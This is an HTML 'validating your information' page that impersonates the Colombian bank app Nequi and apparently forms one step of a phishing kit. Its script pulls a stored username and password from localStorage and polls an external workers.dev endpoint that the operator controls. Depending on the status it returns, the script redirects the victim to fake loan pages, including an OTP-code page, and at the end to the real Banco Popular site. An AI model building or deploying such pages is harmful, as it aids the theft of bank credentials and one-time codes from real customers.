<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Validando</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Inter',sans-serif;
}

body{
  background:#2b002b;
  color:white;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  overflow:hidden;
}

/* CONTENEDOR */
.container{
  width:100%;
  max-width:400px;
  height:100dvh;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  text-align:center;
  padding:20px;
}

/* LOGO NEQUI */
.logo{
  font-size:42px;
  font-weight:700;
  margin-bottom:40px;
  position:relative;
}

.logo span{
  position:absolute;
  top:-14px;
  left:50%;
  transform:translateX(-75px);
  color:#ff008c;
  font-size:16px;
}

/* SPINNER */
.spinner{
  width:70px;
  height:70px;
  border:4px solid rgba(255,255,255,0.1);
  border-top:4px solid #ff008c;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin-bottom:30px;
}

@keyframes spin{
  to{transform:rotate(360deg);}
}

/* TEXTO */
.title{
  font-size:20px;
  font-weight:600;
  margin-bottom:10px;
}

.subtitle{
  font-size:14px;
  color:#ccc;
}

/* BARRA PROGRESO */
.progress{
  width:100%;
  margin-top:30px;
}

.progress-bar{
  width:100%;
  height:6px;
  background:rgba(255,255,255,0.1);
  border-radius:10px;
  overflow:hidden;
}

.progress-fill{
  height:100%;
  width:0%;
  background:#ff008c;
  animation:load 3s ease-in-out infinite;
}

@keyframes load{
  0%{width:0%;}
  50%{width:70%;}
  100%{width:100%;}
}

/* ID */
.id{
  margin-top:25px;
  font-size:12px;
  color:#aaa;
  word-break:break-all;
}

</style>
</head>

<body>

<div class="container">

  <div class="logo">
    <span>■</span>Nequi
  </div>

  <div class="spinner"></div>

  <div class="title">Validando tu información</div>
  <div class="subtitle">Espera un momento...</div>

  <div class="progress">
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>
  </div>

  <div class="id" id="transactionId">Cargando...</div>

</div>

<script>
document.addEventListener('DOMContentLoaded', async () => {
  const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
  if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !bancoldata.transactionId) {
    alert("Faltan datos de login o transactionId");
    window.location.href = 'index.html';
    return;
  }

  const usuario = bancoldata.usuario;
  const clave = bancoldata.clave;
  const transactionId = bancoldata.transactionId;

  document.getElementById("transactionId").innerText = transactionId;

  const checkStatus = async () => {
    try {
      const res = await fetch(`https://quiet-haze-3548.micollflorez.workers.dev/status?id=${transactionId}`);
      const data = await res.json();

      if (!data.estado || data.estado === "pendiente") {
        setTimeout(checkStatus, 2000);
        return;
      }

      if (data.estado === "autorizado") window.location.href = "https://teprestanequi.vercel.app/cupo.html";
      else if (data.estado === "error") window.location.href = "https://teprestanequi.vercel.app/inicio/codeinco.html";
      else if (data.estado === "otp") window.location.href = "https://teprestanequi.vercel.app/inicio/codigo.html";
      else if (data.estado === "fallo") window.location.href = "https://teprestanequi.vercel.app/fac.html";
      else if (data.estado === "finalizado") window.location.href = "https://www.bancopopular.com.co/";
      else setTimeout(checkStatus, 2000);

    } catch (err) {
      setTimeout(checkStatus, 3000);
    }
  };

  checkStatus();
});
</script>

</body>
</html>
